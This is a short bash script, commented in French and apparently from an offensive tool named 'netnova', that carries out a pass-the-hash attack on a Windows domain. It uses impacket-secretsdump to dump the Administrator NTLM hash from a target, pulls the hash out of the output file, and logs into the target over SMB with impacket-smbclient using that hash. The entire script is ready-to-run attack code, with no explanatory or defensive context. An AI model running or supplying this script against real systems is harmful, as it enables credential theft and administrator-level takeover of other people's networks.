#!/bin/bash
TARGET=$1
DOMAIN=$2
USER=$3
PASSWORD=$4
LOG_FILE="/tmp/netnova_pth.log"

mkdir -p /tmp/netnova_attack

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Pass-the-Hash lancé sur $TARGET ($DOMAIN)" > $LOG_FILE
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Récupération du hash NTLM de Administrator..." >> $LOG_FILE

# Dump du hash NTLM via impacket-secretsdump
impacket-secretsdump "$DOMAIN/$USER:$PASSWORD@$TARGET" \
    -just-dc-user Administrator \
    -outputfile /tmp/netnova_attack/pth_hashes 2>&1 | tee -a $LOG_FILE

# Extraire le hash NTLM
HASH=$(grep -i "Administrator" /tmp/netnova_attack/pth_hashes.ntds 2>/dev/null | head -1 | cut -d: -f4)

if [ -n "$HASH" ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Hash NTLM récupéré : $HASH" >> $LOG_FILE
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Tentative d'authentification avec le hash..." >> $LOG_FILE

    # Authentification avec le hash NTLM
    impacket-smbclient "$DOMAIN/Administrator@$TARGET" \
        -hashes ":$HASH" \
        -no-pass \
        -c "ls" 2>&1 | tee -a $LOG_FILE

    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Pass-the-Hash terminé — accès SMB obtenu sur $TARGET" >> $LOG_FILE
else
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Hash non récupéré — cible probablement durcie (LAPS actif)" >> $LOG_FILE
fi

cat $LOG_FILE